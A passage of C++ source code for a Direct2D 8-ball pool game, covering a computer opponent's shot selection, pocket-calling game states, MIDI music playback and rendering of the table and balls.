        float bottom = TABLE_BOTTOM - CUSHION_THICKNESS - BALL_RADIUS;

        if (x < left || x > right || y < top || y > bottom) {
            return false;
        }

        // Check headstring restriction if needed
        if (checkHeadstring && x >= HEADSTRING_X) {
            return false;
        }

        // Check overlap with other balls
        for (size_t i = 0; i < balls.size(); ++i) {
            if (balls[i].id != 0 && !balls[i].isPocketed) { // Don't check against itself or pocketed balls
                if (GetDistanceSq(x, y, balls[i].x, balls[i].y) < (BALL_RADIUS * 2.0f) * (BALL_RADIUS * 2.0f)) {
                    return false; // Overlapping another ball
                }
            }
        }

        return true;
    }

    // --- NEW HELPER FUNCTION IMPLEMENTATIONS ---

    // Checks if a player has pocketed all their balls and is now on the 8-ball.
    bool IsPlayerOnEightBall(int player) {
        PlayerInfo& playerInfo = (player == 1) ? player1Info : player2Info;
        if (playerInfo.assignedType != BallType::NONE && playerInfo.assignedType != BallType::EIGHT_BALL && playerInfo.ballsPocketedCount >= 7) {
            Ball* eightBall = GetBallById(8);
            return (eightBall && !eightBall->isPocketed);
        }
        return false;
    }

    void CheckAndTransitionToPocketChoice(int playerID) {
        bool needsToCall = IsPlayerOnEightBall(playerID);

        if (needsToCall) {
            if (playerID == 1) { // Human Player 1
                currentGameState = CHOOSING_POCKET_P1;
                pocketCallMessage = player1Info.name + L"": Choose a pocket for the 8-Ball..."";
                if (calledPocketP1 == -1) calledPocketP1 = 2; // Default to bottom-right
            }
            else { // Player 2
                if (isPlayer2AI) {
                    // FOOLPROOF FIX: AI doesn't choose here. It transitions to a thinking state.
                    // AIMakeDecision will handle the choice and the pocket call.
                    currentGameState = AI_THINKING;
                    aiTurnPending = true; // Signal the main loop to run AIMakeDecision
                }
                else { // Human Player 2
                    currentGameState = CHOOSING_POCKET_P2;
                    pocketCallMessage = player2Info.name + L"": Choose a pocket for the 8-Ball..."";
                    if (calledPocketP2 == -1) calledPocketP2 = 2; // Default to bottom-right
                }
            }
        }
        else {
            // Player does not need to call a pocket, proceed to normal turn.
            pocketCallMessage = L"""";
            currentGameState = (playerID == 1) ? PLAYER1_TURN : PLAYER2_TURN;
            if (playerID == 2 && isPlayer2AI) {
                aiTurnPending = true;
            }
        }
    }


    template <typename T>
    void SafeRelease(T** ppT) {
        if (*ppT) {
            (*ppT)->Release();
            *ppT = nullptr;
        }
    }

    // --- CPU Ball?in?Hand Placement --------------------------------
    // Moves the cue ball to a legal ""ball in hand"" position for the AI.
    void AIPlaceCueBall() {
        Ball* cue = GetCueBall();
        if (!cue) return;

        // Simple strategy: place back behind the headstring at the standard break spot
        cue->x = TABLE_LEFT + TABLE_WIDTH * 0.15f;
        cue->y = RACK_POS_Y;
        cue->vx = cue->vy = 0.0f;
    }

    // --- Helper Function for Line Segment Intersection ---
    // Finds intersection point of line segment P1->P2 and line segment P3->P4
    // Returns true if they intersect, false otherwise. Stores intersection point in 'intersection'.
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
    {
        float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

        // Check if lines are parallel or collinear
        if (fabs(denominator) < 1e-6) {
            return false;
        }

        float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
        float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

        // Check if intersection point lies on both segments
        if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
            intersection.x = p1.x + ua * (p2.x - p1.x);
            intersection.y = p1.y + ua * (p2.y - p1.y);
            return true;
        }

        return false;
    }

    // --- INSERT NEW HELPER FUNCTION HERE ---
    // Calculates the squared distance from point P to the line segment AB.
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
        float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
        if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
        // Consider P projecting onto the line AB infinite line
        // t = [(P-A) . (B-A)] / |B-A|^2
        float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
        t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
        // Projection falls on the segment
        D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
        return GetDistanceSq(p.x, p.y, projection.x, projection.y);
    }
    // --- End New Helper ---

    // --- NEW AI Implementation Functions ---

    void AIMakeDecision() {
        // Start with a clean slate for the AI's plan.
        aiPlannedShotDetails.isValid = false;
        Ball* cueBall = GetCueBall();
        if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

        // Ask the ""expert"" (AIFindBestShot) for the best possible shot.
        AIShotInfo bestShot = AIFindBestShot();

        if (bestShot.possible) {
            // A good shot was found.
            // If it's an 8-ball shot, ""call"" the pocket.
            if (bestShot.involves8Ball) {
                calledPocketP2 = bestShot.pocketIndex;
            }
            else {
                calledPocketP2 = -1; // Ensure no pocket is called on a normal shot.
            }

            // Commit the details of the best shot to the AI's plan.
            aiPlannedShotDetails.angle = bestShot.angle;
            aiPlannedShotDetails.power = bestShot.power;
            aiPlannedShotDetails.spinX = bestShot.spinX;
            aiPlannedShotDetails.spinY = bestShot.spinY;
            aiPlannedShotDetails.isValid = true;

        }
        else {
            // No good offensive shot found, must play a safe defensive shot.
            // (This is a fallback and your current AIFindBestShot should prevent this)
            aiPlannedShotDetails.isValid = false;
        }

        // --- FOOLPROOF FIX: Trigger the Aim Display ---
        // If any valid plan was made, update the visuals and start the display pause.
        if (aiPlannedShotDetails.isValid) {

            // STEP 1: Copy the AI's plan into the global variables used for drawing.
            // This is the critical missing link.
            cueAngle = aiPlannedShotDetails.angle;
            shotPower = aiPlannedShotDetails.power;

            // STEP 2: Trigger the visual display pause.
            // These are the two lines you correctly identified.
            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;

        }
        else {
            // Absolute fallback: If no plan could be made, switch turns to prevent a freeze.
            SwitchTurns();
        }
    }


    AIShotInfo AIFindBestShot()
    {
        AIShotInfo best;                       // .possible == false
        Ball* cue = GetCueBall();
        if (!cue) return best;

        const bool on8 = IsPlayerOnEightBall(2);
        const BallType wantType = player2Info.assignedType;

        for (Ball& b : balls)
        {
            if (b.isPocketed || b.id == 0) continue;

            // decide if this ball is a legal/interesting target
            bool ok =
                on8 ? (b.id == 8) :
                ((wantType == BallType::NONE) || (b.type == wantType));

            if (!ok) continue;

            for (int p = 0; p < 6; ++p)
            {
                AIShotInfo cand = EvaluateShot(&b, p);
                if (cand.possible &&
                    (!best.possible || cand.score > best.score))
                    best = cand;
            }
        }

        // fall-back: tap cue ball forward (safety) if no potting line exists
        if (!best.possible && cue)
        {
            best.possible = true;
            best.angle = static_cast<float>(rand()) / RAND_MAX * 2.0f * PI;
            best.power = MAX_SHOT_POWER * 0.30f;
            best.spinX = best.spinY = 0.0f;
            best.targetBall = nullptr;
            best.score = -99999.0f;
            best.pocketIndex = -1;
        }
        return best;
    }


    // Evaluate a potential shot at a specific target ball towards a specific pocket
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
        AIShotInfo shotInfo; // Defaults to not possible
        shotInfo.targetBall = targetBall;
        shotInfo.pocketIndex = pocketIndex;
        shotInfo.involves8Ball = (targetBall && targetBall->id == 8);

        Ball* cueBall = GetCueBall();
        if (!cueBall || !targetBall) return shotInfo;

        // 1. Calculate Ghost Ball position (where cue must hit target)
        shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

        // 2. Check Path: Cue Ball -> Ghost Ball Position
        if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
            return shotInfo; // Path blocked, shot is impossible.
        }

        // 3. Calculate Angle and Power
        float dx = shotInfo.ghostBallPos.x - cueBall->x;
        float dy = shotInfo.ghostBallPos.y - cueBall->y;
        shotInfo.angle = atan2f(dy, dx);

        float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
        float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);
        shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

        // 4. Score the shot (simple scoring: closer and straighter is better)
        shotInfo.score = 1000.0f - (cueToGhostDist + targetToPocketDist);

        // If we reached here, the shot is geometrically possible.
        shotInfo.possible = true;
        return shotInfo;
    }


    //  Estimate the power that will carry the cue-ball to the ghost position
    //  *and* push the object-ball the remaining distance to the pocket.
    //
    //  • cueToGhostDist    – pixels from cue to ghost-ball centre
    //  • targetToPocketDist– pixels from object-ball to chosen pocket
    //
    //  The function is fully deterministic (good for AI search) yet produces
    //  human-looking power levels.
    //
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist)
    {
        // Total distance the *energy* must cover (cue path + object-ball path)
        float totalDist = cueToGhostDist + targetToPocketDist;

        // Typical diagonal of the playable area (approx.) – used for scaling
        constexpr float TABLE_DIAG = 900.0f;

        // 1.  Convert distance to a 0-1 number (0: tap-in, 1: table length)
        float norm = std::clamp(totalDist / TABLE_DIAG, 0.0f, 1.0f);

        // 2.  Ease-in curve (smoothstep) for nicer progression
        norm = norm * norm * (3.0f - 2.0f * norm);

        // 3.  Blend between a gentle minimum and the absolute maximum
        const float MIN_POWER = MAX_SHOT_POWER * 0.18f;     // just enough to move
        float power = MIN_POWER + norm * (MAX_SHOT_POWER - MIN_POWER);

        // 4.  Safety clamp (also screens out degenerate calls)
        power = std::clamp(power, 0.15f, MAX_SHOT_POWER);

        return power;
    }

    // ------------------------------------------------------------------
    //  Return the ghost-ball centre needed for the target ball to roll
    //  straight into the chosen pocket.
    // ------------------------------------------------------------------
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex)
    {
        if (!targetBall) return D2D1::Point2F(0, 0);

        D2D1_POINT_2F P = pocketPositions[pocketIndex];

        float vx = P.x - targetBall->x;
        float vy = P.y - targetBall->y;
        float L = sqrtf(vx * vx + vy * vy);
        if (L < 1.0f) L = 1.0f;                // safety

        vx /= L;   vy /= L;

        return D2D1::Point2F(
            targetBall->x - vx * (BALL_RADIUS * 2.0f),
            targetBall->y - vy * (BALL_RADIUS * 2.0f));
    }

    // Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
    // ────────────────────────────────────────────────────────────────
    //   2.  Shot evaluation & search
    // ────────────────────────────────────────────────────────────────

    //  Calculate ghost-ball position so that cue hits target towards pocket
    static inline D2D1_POINT_2F GhostPos(const Ball* tgt, int pocketIdx)
    {
        D2D1_POINT_2F P = pocketPositions[pocketIdx];
        float vx = P.x - tgt->x;
        float vy = P.y - tgt->y;
        float L = sqrtf(vx * vx + vy * vy);
        vx /= L;  vy /= L;
        return D2D1::Point2F(tgt->x - vx * (BALL_RADIUS * 2.0f),
            tgt->y - vy * (BALL_RADIUS * 2.0f));
    }

    //  Heuristic: shorter + straighter + proper group = higher score
    static inline float ScoreShot(float cue2Ghost,
        float tgt2Pocket,
        bool  correctGroup,
        bool  involves8)
    {
        float base = 2000.0f - (cue2Ghost + tgt2Pocket);   // prefer close shots
        if (!correctGroup)  base -= 400.0f;                  // penalty
        if (involves8)      base += 150.0f;                  // a bit more desirable
        return base;
    }

    // Checks if line segment is clear of obstructing balls
    // ────────────────────────────────────────────────────────────────
    //   1.  Low-level helpers – IsPathClear & FindFirstHitBall
    // ────────────────────────────────────────────────────────────────

    //  Test if the capsule [ start … end ] (radius = BALL_RADIUS)
    //  intersects any ball except the ids we want to ignore.
    bool IsPathClear(D2D1_POINT_2F start,
        D2D1_POINT_2F end,
        int ignoredBallId1,
        int ignoredBallId2)
    {
        float dx = end.x - start.x;
        float dy = end.y - start.y;
        float lenSq = dx * dx + dy * dy;
        if (lenSq < 1e-3f) return true;             // degenerate → treat as clear

        for (const Ball& b : balls)
        {
            if (b.isPocketed)      continue;
            if (b.id == ignoredBallId1 ||
                b.id == ignoredBallId2)             continue;

            // project ball centre onto the segment
            float t = ((b.x - start.x) * dx + (b.y - start.y) * dy) / lenSq;
            t = std::clamp(t, 0.0f, 1.0f);

            float cx = start.x + t * dx;
            float cy = start.y + t * dy;

            if (GetDistanceSq(b.x, b.y, cx, cy) < (BALL_RADIUS * BALL_RADIUS))
                return false;                       // blocked
        }
        return true;
    }

    //  Cast an (infinite) ray and return the first non-pocketed ball hit.
    //  `hitDistSq` is distance² from the start point to the collision point.
    Ball* FindFirstHitBall(D2D1_POINT_2F start,
        float        angle,
        float& hitDistSq)
    {
        Ball* hitBall = nullptr;
        float  bestSq = std::numeric_limits<float>::max();
        float  cosA = cosf(angle);
        float  sinA = sinf(angle);

        for (Ball& b : balls)
        {
            if (b.id == 0 || b.isPocketed) continue;         // ignore cue & sunk balls

            float relX = b.x - start.x;
            float relY = b.y - start.y;
            float proj = relX * cosA + relY * sinA;          // distance along the ray

            if (proj <= 0) continue;                         // behind cue

            // closest approach of the ray to the sphere centre
            float closestX = start.x + proj * cosA;
            float closestY = start.y + proj * sinA;
            float dSq = GetDistanceSq(b.x, b.y, closestX, closestY);

            if (dSq <= BALL_RADIUS * BALL_RADIUS)            // intersection
            {
                float back = sqrtf(BALL_RADIUS * BALL_RADIUS - dSq);
                float collDist = proj - back;                // front surface
                float collSq = collDist * collDist;
                if (collSq < bestSq)
                {
                    bestSq = collSq;
                    hitBall = &b;
                }
            }
        }
        hitDistSq = bestSq;
        return hitBall;
    }

    // Basic check for reasonable AI aim angles (optional)
    bool IsValidAIAimAngle(float angle) {
        // Placeholder - could check for NaN or infinity if calculations go wrong
        return isfinite(angle);
    }

    //midi func = start
    void PlayMidiInBackground(HWND hwnd, const TCHAR* midiPath) {
        while (isMusicPlaying) {
            MCI_OPEN_PARMS mciOpen = { 0 };
            mciOpen.lpstrDeviceType = TEXT(""sequencer"");
            mciOpen.lpstrElementName = midiPath;

            if (mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen) == 0) {
                midiDeviceID = mciOpen.wDeviceID;

                MCI_PLAY_PARMS mciPlay = { 0 };
                mciSendCommand(midiDeviceID, MCI_PLAY, 0, (DWORD_PTR)&mciPlay);

                // Wait for playback to complete
                MCI_STATUS_PARMS mciStatus = { 0 };
                mciStatus.dwItem = MCI_STATUS_MODE;

                do {
                    mciSendCommand(midiDeviceID, MCI_STATUS, MCI_STATUS_ITEM, (DWORD_PTR)&mciStatus);
                    Sleep(100); // adjust as needed
                } while (mciStatus.dwReturn == MCI_MODE_PLAY && isMusicPlaying);

                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    void StartMidi(HWND hwnd, const TCHAR* midiPath) {
        if (isMusicPlaying) {
            StopMidi();
        }
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }

    void StopMidi() {
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) musicThread.join();
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    /*void PlayGameMusic(HWND hwnd) {
        // Stop any existing playback
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) {
                musicThread.join();
            }
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }

        // Get the path of the executable
        TCHAR exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Extract the directory path
        TCHAR* lastBackslash = _tcsrchr(exePath, '\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = '\0';
        }

        // Construct the full path to the MIDI file
        static TCHAR midiPath[MAX_PATH];
        _tcscpy_s(midiPath, MAX_PATH, exePath);
        _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID""));

        // Start the background playback
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }*/
    //midi func = end

    // --- Drawing Functions ---

    void OnPaint() {
        HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

        if (SUCCEEDED(hr)) {
            pRenderTarget->BeginDraw();
            DrawScene(pRenderTarget); // Pass render target
            hr = pRenderTarget->EndDraw();

            if (hr == D2DERR_RECREATE_TARGET) {
                DiscardDeviceResources();
                // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
                // But the timer loop will trigger redraw anyway.
            }
        }
        // If CreateDeviceResources failed, EndDraw might not be called.
        // Consider handling this more robustly if needed.
    }

    void DrawScene(ID2D1RenderTarget* pRT) {
        if (!pRT) return;

        //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
        // Set background color to #ffffcd (RGB: 255, 255, 205)
        pRT->Clear(D2D1::ColorF(0.3686f, 0.5333f, 0.3882f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)
        //pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)

        DrawTable(pRT, pFactory);
        DrawPocketSelectionIndicator(pRT); // Draw arrow over selected/called pocket
        DrawBalls(pRT);
        DrawAimingAids(pRT); // Includes cue stick if aiming
        DrawUI(pRT);
        DrawPowerMeter(pRT);
        DrawSpinIndicator(pRT);
        DrawPocketedBallsIndicator(pRT);
        DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

         // Draw Game Over Message
        if (currentGameState == GAME_OVER && pTextFormat) {
            ID2D1SolidColorBrush* pBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
            if (pBrush) {
                D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
                pRT->DrawText(
                    gameOverMessage.c_str(),
                    (UINT32)gameOverMessage.length(),
                    pTextFormat, // Use large format maybe?
                    &layoutRect,
                    pBrush
                );
                SafeRelease(&pBrush);
            }
        }

    }

    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory) {
        ID2D1SolidColorBrush* pBrush = nullptr;

        // === Draw Full Orange Frame (Table Border) ===
        ID2D1SolidColorBrush* pFrameBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.9157f, 0.6157f, 0.2000f), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        if (pFrameBrush) {
            D2D1_RECT_F outerRect = D2D1::RectF(
                TABLE_LEFT - CUSHION_THICKNESS,
                TABLE_TOP - CUSHION_THICKNESS,
                TABLE_RIGHT + CUSHION_THICKNESS,
                TABLE_BOTTOM + CUSHION_THICKNESS
            );
            pRT->FillRectangle(&outerRect, pFrameBrush);
            SafeRelease(&pFrameBrush);
        }

        // Draw Table Bed (Green Felt)
        pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
        if (!pBrush) return;
        D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
        pRT->FillRectangle(&tableRect, pBrush);
        SafeRelease(&pBrush);

        // ------------------------------------------------------------------
//  Spotlight overlay (soft radial inside a rounded rectangle)
// ------------------------------------------------------------------
        {
            // 2.1  Build a radial gradient brush (edge = base cloth, centre = lighter)
            ID2D1RadialGradientBrush* pSpot = nullptr;
            ID2D1GradientStopCollection* pStops = nullptr;

            D2D1_COLOR_F centreClr = D2D1::ColorF(
                std::min(1.f, TABLE_COLOR.r * 1.60f),   // lighten ~60 %
                std::min(1.f, TABLE_COLOR.g * 1.60f),
                std::min(1.f, TABLE_COLOR.b * 1.60f));

            const D2D1_GRADIENT_STOP gs[3] =
            {
                { 0.0f, D2D1::ColorF(centreClr.r, centreClr.g, centreClr.b, 0.95f) },
                { 0.6f, D2D1::ColorF(TABLE_COLOR.r, TABLE_COLOR.g, TABLE_COLOR.b, 0.55f) },
                { 1.0f, D2D1::ColorF(TABLE_COLOR.r, TABLE_COLOR.g, TABLE_COLOR.b, 0.0f) }
            };
            pRT->CreateGradientStopCollection(gs, 3, &pStops);

            if (pStops)
            {
                D2D1_RECT_F rc = tableRect;
                const float PAD = 18.0f;                   // inset so corners stay dark
                rc.left += PAD;  rc.top += PAD;
                rc.right -= PAD;  rc.bottom -= PAD;

                // centre point & radii
                D2D1_POINT_2F centre = D2D1::Point2F(
                    (rc.left + rc.right) / 2.0f,
                    (rc.top + rc.bottom) / 2.0f);

                float rx = (rc.right - rc.left) * 0.55f;
                float ry = (rc.bottom - rc.top) * 0.55f;

                D2D1_RADIAL_GRADIENT_BRUSH_PROPERTIES props =
                    D2D1::RadialGradientBrushProperties(
                        centre,                       // origin
                        D2D1::Point2F(0, 0),          // offset
                        rx, ry);

                pRT->CreateRadialGradientBrush(props, pStops, &pSpot);
                pStops->Release();
            }

            if (pSpot)
            {
                // Use the same rounded rectangle the pocket bar uses for subtle round corners
                const float RADIUS = 20.0f;                       // corner radius
                D2D1_ROUNDED_RECT spotlightRR =
                    D2D1::RoundedRect(tableRect, RADIUS, RADIUS);

                pRT->FillRoundedRectangle(&spotlightRR, pSpot);
                pSpot->Release();
            }
        }

        // Draw Cushions (Red Border)
        pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
        if (!pBrush) return;
        // Top Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        // Bottom Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        // Left Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        // Right Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        SafeRelease(&pBrush);


        // Draw Pockets (Black Circles)
        pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
        if (!pBrush) return;
        for (int i = 0; i < 6; ++i) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
            pRT->FillEllipse(&ellipse, pBrush);
        }
        SafeRelease(&pBrush);

        // Draw Headstring Line (White)
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        if (!pBrush) return;
        pRT->DrawLine(
            D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
            D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
            pBrush,
            1.0f // Line thickness
        );
        SafeRelease(&pBrush);

        // Draw Semicircle facing West (flat side East)
        // Draw Semicircle facing East (curved side on the East, flat side on the West)
        ID2D1PathGeometry* pGeometry = nullptr;
        HRESULT hr = pFactory->CreatePathGeometry(&pGeometry);
        if (SUCCEEDED(hr) && pGeometry)
        {
            ID2D1GeometrySink* pSink = nullptr;
            hr = pGeometry->Open(&pSink);
            if (SUCCEEDED(hr) && pSink)
            {
                float radius = 60.0f; // Radius for the semicircle
                D2D1_POINT_2F center = D2D1::Point2F(HEADSTRING_X, (TABLE_TOP + TABLE_BOTTOM) / 2.0f);

                // For a semicircle facing East (curved side on the East), use the top and bottom points.
                D2D1_POINT_2F startPoint = D2D1::Point2F(center.x, center.y - radius); // Top point

                pSink->BeginFigure(startPoint, D2D1_FIGURE_BEGIN_HOLLOW);

                D2D1_ARC_SEGMENT arc = {};
                arc.point = D2D1::Point2F(center.x, center.y + radius); // Bottom point
                arc.size = D2D1::SizeF(radius, radius);
                arc.rotationAngle = 0.0f;
                // Use the correct identifier with the extra underscore:
                arc.sweepDirection = D2D1_SWEEP_DIRECTION_COUNTER_CLOCKWISE;
                arc.arcSize = D2D1_ARC_SIZE_SMALL;

                pSink->AddArc(&arc);
                pSink->EndFigure(D2D1_FIGURE_END_OPEN);
                pSink->Close();
                SafeRelease(&pSink);

                ID2D1SolidColorBrush* pArcBrush = nullptr;
                //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.3f), &pArcBrush);
                pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pArcBrush);
                if (pArcBrush)
                {
                    pRT->DrawGeometry(pGeometry, pArcBrush, 1.5f);
                    SafeRelease(&pArcBrush);
                }
            }
            SafeRelease(&pGeometry);
        }




    }


    // ----------------------------------------------
    //  Helper : clamp to [0,1] and lighten a colour
    // ----------------------------------------------
    static D2D1_COLOR_F Lighten(const D2D1_COLOR_F& c, float factor = 1.25f)
    {
        return D2D1::ColorF(
            std::min(1.0f, c.r * factor),
            std::min(1.0f, c.g * factor),
            std::min(1.0f, c.b * factor),
            c.a);
    }

    // ------------------------------------------------
    //  NEW  DrawBalls – radial-gradient “spot-light”
    // ------------------------------------------------
    void DrawBalls(ID2D1RenderTarget* pRT)
    {
        if (!pRT) return;

        ID2D1SolidColorBrush* pStripeBrush = nullptr;    // white stripe
        ID2D1SolidColorBrush* pBorderBrush = nullptr;    // black ring

        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);

        for (const Ball& b : balls)
        {
            if (b.isPocketed) continue;

            //------------------------------------------
            // Build the radial gradient for THIS ball
            //------------------------------------------
            ID2D1GradientStopCollection* pStops = nullptr;
            ID2D1RadialGradientBrush* pRad = nullptr;

            D2D1_GRADIENT_STOP gs[3];
            gs[0].position = 0.0f;  gs[0].color = D2D1::ColorF(1, 1, 1, 0.95f);     // bright spot
            gs[1].position = 0.35f; gs[1].color = Lighten(b.color);                 // transitional
            gs[2].position = 1.0f;  gs[2].color = b.color;                          // base colour

            pRT->CreateGradientStopCollection(gs, 3, &pStops);

            if (pStops)
            {
                // Place the hot-spot slightly towards top-left to look more 3-D
                D2D1_POINT_2F origin = D2D1::Point2F(b.x - BALL_RADIUS * 0.4f,
                    b.y - BALL_RADIUS * 0.4f);

                D2D1_RADIAL_GRADIENT_BRUSH_PROPERTIES props =
                    D2D1::RadialGradientBrushProperties(
                        origin,                        // gradientOrigin
                        D2D1::Point2F(0, 0),           // offset (not used here)
                        BALL_RADIUS * 1.3f,            // radiusX
                        BALL_RADIUS * 1.3f);           // radiusY

                pRT->CreateRadialGradientBrush(props, pStops, &pRad);
                SafeRelease(&pStops);
            }

            //------------------------------------------
            //  Draw the solid or striped ball itself
            //------------------------------------------
            D2D1_ELLIPSE outer = D2D1::Ellipse(
                D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            if (pRad)  pRT->FillEllipse(&outer, pRad);

            // ----------  Stripe overlay  -------------
            if (b.type == BallType::STRIPE && pStripeBrush)
            {
                // White band
                D2D1_RECT_F stripe = D2D1::RectF(
                    b.x - BALL_RADIUS,
                    b.y - BALL_RADIUS * 0.40f,
                    b.x + BALL_RADIUS,
                    b.y + BALL_RADIUS * 0.40f);
                pRT->FillRectangle(&stripe, pStripeBrush);

                // Inner circle (give stripe area same glossy shading)
                if (pRad)
                {
                    D2D1_ELLIPSE inner = D2D1::Ellipse(
                        D2D1::Point2F(b.x, b.y),
                        BALL_RADIUS * 0.60f,
                        BALL_RADIUS * 0.60f);
                    pRT->FillEllipse(&inner, pRad);
                }
            }

            // Black border
            if (pBorderBrush)
                pRT->DrawEllipse(&outer, pBorderBrush, 1.5f);

            SafeRelease(&pRad);
        }

        SafeRelease(&pStripeBrush);
        SafeRelease(&pBorderBrush);
    }

